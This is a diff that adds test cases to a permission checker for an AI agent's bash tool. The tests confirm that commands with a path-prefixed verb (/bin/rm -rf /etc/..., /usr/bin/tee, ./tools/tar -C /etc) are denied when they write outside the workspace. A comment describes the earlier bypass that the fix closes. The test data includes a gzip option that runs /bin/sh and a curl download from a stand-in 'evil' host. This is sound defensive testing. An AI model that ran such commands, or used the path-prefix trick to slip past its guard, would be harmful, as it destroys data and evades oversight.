@@ -489,5 +489,43 @@ check('bash gzip --use-compress-program to UNPROTECTED target (deny, unverifiabl
   { name: 'bash', arguments: { command: 'gzip --use-compress-program=/bin/sh big.log', description: 'compress' } },
   { allow: false, category: 'unknown' }, [], false)
 
+// f-round-21 abs-prefix: absolute-path verb target extraction. The verb may
+// arrive with a path prefix (`/usr/bin/touch`, `/opt/homebrew/bin/rm`,
+// `./tools/tar`) — the write-target extractor must normalize to the basename
+// or the command falls into the implicit-target branch with an empty
+// targetPaths and is vouchsafed by session-cwd coverage alone, allowing
+// out-of-workspace writes (`/bin/rm -rf /etc/...` -> ALLOWED before this fix).
+check('bash /usr/bin/touch /etc/tmg-a1 (abs-prefix verb, outside write -> deny)',
+  { name: 'bash', arguments: { command: '/usr/bin/touch /etc/tmg-a1', description: 'abs touch' } },
+  { allow: false, category: 'file_write', paths: ['/etc/tmg-a1'] }, [])
+
+check('bash /bin/rm -rf /etc/tmg-a2 (abs-prefix rm -rf, outside delete -> deny)',
+  { name: 'bash', arguments: { command: '/bin/rm -rf /etc/tmg-a2', description: 'abs rm -rf' } },
+  { allow: false, category: 'file_write', paths: ['/etc/tmg-a2'] }, [])
+
+check('bash /usr/bin/rm /etc/tmg-a3 (abs-prefix rm, outside delete -> deny)',
+  { name: 'bash', arguments: { command: '/usr/bin/rm /etc/tmg-a3', description: 'abs rm' } },
+  { allow: false, category: 'file_write', paths: ['/etc/tmg-a3'] }, [])
+
+check('bash /usr/bin/tee /etc/tmg-t (abs-prefix tee, outside write -> deny)',
+  { name: 'bash', arguments: { command: '/usr/bin/tee /etc/tmg-t', description: 'abs tee' } },
+  { allow: false, category: 'file_write', paths: ['/etc/tmg-t'] }, [])
+
+check('bash /opt/homebrew/bin/rm /etc/tmg-hb (abs-prefix rm, outside delete -> deny)',
+  { name: 'bash', arguments: { command: '/opt/homebrew/bin/rm /etc/tmg-hb', description: 'homebrew abs rm' } },
+  { allow: false, category: 'file_write', paths: ['/etc/tmg-hb'] }, [])
+
+check('bash ./tools/tar xf a.tar -C /etc (rel-prefix tar, outside extract -> deny)',
+  { name: 'bash', arguments: { command: './tools/tar xf a.tar -C /etc', description: 'rel tar' } },
+  { allow: false, category: 'file_write', paths: ['/etc'] }, [])
+
+check('bash /usr/bin/curl -o /tmp/tmg-c (abs-prefix curl -o temp download -> allow)',
+  { name: 'bash', arguments: { command: '/usr/bin/curl -o /tmp/tmg-c http://evil/x', description: 'abs curl' } },
+  { allow: true, category: 'file_write', paths: ['/tmp/tmg-c'] }, [])
+
+check('bash /usr/bin/touch ws.txt (abs-prefix verb, in-cwd write -> allow)',
+  { name: 'bash', arguments: { command: '/usr/bin/touch ws.txt', description: 'abs touch cwd' } },
+  { allow: true, category: 'file_write', paths: [`${process.cwd()}/ws.txt`] }, [])
+
 console.log(`\n${pass} passed, ${fail} failed`)
 process.exit(fail > 0 ? 1 : 0)
